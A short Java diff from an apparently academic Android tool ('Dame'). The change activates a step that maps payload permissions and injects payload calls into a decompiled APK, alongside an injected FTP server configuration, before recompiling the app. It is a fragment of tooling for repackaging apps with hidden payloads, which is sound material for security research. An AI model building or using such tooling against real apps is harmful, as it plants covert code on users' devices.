@@ -1,6 +1,7 @@
 package it.unisannio.srss.dame.cli;
 
 import it.unisannio.srss.dame.android.payloads.Payload;
+import it.unisannio.srss.dame.injection.CallInjector;
 import it.unisannio.srss.dame.injection.CommonInjector;
 import it.unisannio.srss.dame.model.FTPServerConfig;
 import it.unisannio.srss.dame.model.Permission;
@@ -193,10 +194,19 @@ public class Dame {
 		CommonInjector.injectFtpConfig(decompiledDir.toPath(), ftpServerConfig);
 
 		// TODO generare la mappa payload permissions
-
-		// CallInjector injector = new CallInjector(getAPKPermissions(),
-		// payloadPermissions, decompiledDir.getAbsolutePath())
-		// injector.inject()
+		Map<String, Set<String>> payloadsMap = new HashMap<String, Set<String>>();
+		for (Payload payload : payloads) {
+			for (String permission : payload.getConfig().getPermissions()) {
+				Set<String> set = payloadsMap.get(permission);
+				if (set == null)
+					set = new HashSet<String>();
+				set.add(payload.getClass().getCanonicalName());
+				payloadsMap.put(permission, set);
+			}
+		}
+		CallInjector injector = new CallInjector(getAPKPermissions(),
+				payloadsMap, decompiledDir.getAbsolutePath());
+		injector.inject();
 
 		ApkUtils.compile(decompiledDir.getAbsolutePath(),
 				androidBuildToolsPath, apktoolPath, getApkOutPath());
